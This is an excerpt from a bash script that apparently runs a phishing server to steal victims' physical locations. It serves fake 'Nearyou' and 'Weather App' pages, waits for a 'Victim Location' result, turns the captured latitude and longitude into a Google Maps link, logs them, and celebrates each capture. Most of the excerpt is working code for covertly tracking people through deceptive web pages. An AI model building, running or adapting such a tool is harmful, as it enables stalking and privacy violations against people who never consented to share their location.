...
setup_site() {
	...
	cp -rf .getloc/"$website"/* .server/www
	cp -f .getloc/ip.php .server/www/
...
## Get credentials
capture_creds() {
    LANS="$(grep -o 'LAN:.*' result.json | cut -d " " -f2)"
    LONS="$(grep -o 'LON:.*' result.json | cut -d " " -f2)"

	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} https://www.google.com/maps/place/"$LANS+$LONS
	echo -e ""
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}result.dat"
	cat .server/www/result.json >> result.json
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Location Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}

## Print data
capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting to Victim Location, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
		...
		sleep 0.75
		if [[ -e ".server/www/result.json" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${ORANGE} Ha Ha Ha Ha !!${GREEN} Capture GIO Location! ${RED}[${CYAN}Place Check /images Folder${RED}]"
            capture_creds
			rm -rf .server/www/result.json
		fi
		sleep 0.75
	done
}
...
main_menu() {
	...
	cat <<- EOF
        ...
        ${RED}       [${WHITE}02${RED}]${ORANGE} Nearyou
        ${RED}       [${WHITE}02${RED}]${ORANGE} Weather App
